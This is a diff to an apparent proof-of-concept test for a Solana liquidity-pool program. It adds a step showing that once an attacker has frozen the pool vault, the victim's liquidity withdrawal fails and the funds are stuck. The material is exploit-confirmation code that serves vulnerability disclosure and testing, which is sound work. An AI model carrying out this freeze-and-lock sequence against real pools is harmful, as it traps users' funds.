@@ -309,5 +309,52 @@ describe("freeze authority poc", () => {
     await client.processTransaction(freezeTx);
 
     console.log("STEP 6 PASS: attacker froze the pool vault:", freezeTargetVault.toBase58());
+    // === STEP 7: victim attempts to withdraw — should fail because vault is frozen ===
+    const decreaseLiquidityIx = await program.methods
+      .decreaseLiquidityV2(
+        new anchor.BN(500_000),
+        new anchor.BN(0),
+        new anchor.BN(0)
+      )
+      .accounts({
+        nftOwner: victim.publicKey,
+        nftAccount: positionNftAccount,
+        personalPosition: personalPosition,
+        poolState: poolState,
+        protocolPosition: protocolPosition,
+        tickArrayLower: tickArrayLower,
+        tickArrayUpper: tickArrayUpper,
+        recipientTokenAccount0: victimAta0,
+        recipientTokenAccount1: victimAta1,
+        tokenVault0: tokenVault0,
+        tokenVault1: tokenVault1,
+        tokenProgram: TOKEN_PROGRAM_ID,
+        tokenProgram2022: TOKEN_2022_PROGRAM_ID,
+        vault0Mint: tokenMint0,
+        vault1Mint: tokenMint1,
+      })
+      .instruction();
+
+    const decreaseTx = new Transaction().add(decreaseLiquidityIx);
+    const [bh10] = await client.getLatestBlockhash();
+    decreaseTx.recentBlockhash = bh10;
+    decreaseTx.feePayer = victim.publicKey;
+    decreaseTx.sign(victim);
+
+    let withdrawalFailed = false;
+    let failureReason = "";
+    try {
+      await client.processTransaction(decreaseTx);
+      console.log("STEP 7 UNEXPECTED: withdrawal succeeded (this would mean no bug found)");
+    } catch (err) {
+      withdrawalFailed = true;
+      failureReason = String(err);
+      console.log("STEP 7 CONFIRMED: withdrawal FAILED as expected. Vault is frozen, funds are stuck.");
+      console.log("Failure reason:", failureReason);
+    }
+
+    if (!withdrawalFailed) {
+      throw new Error("VULNERABILITY NOT CONFIRMED: withdrawal succeeded despite frozen vault");
+    }
   });
 });
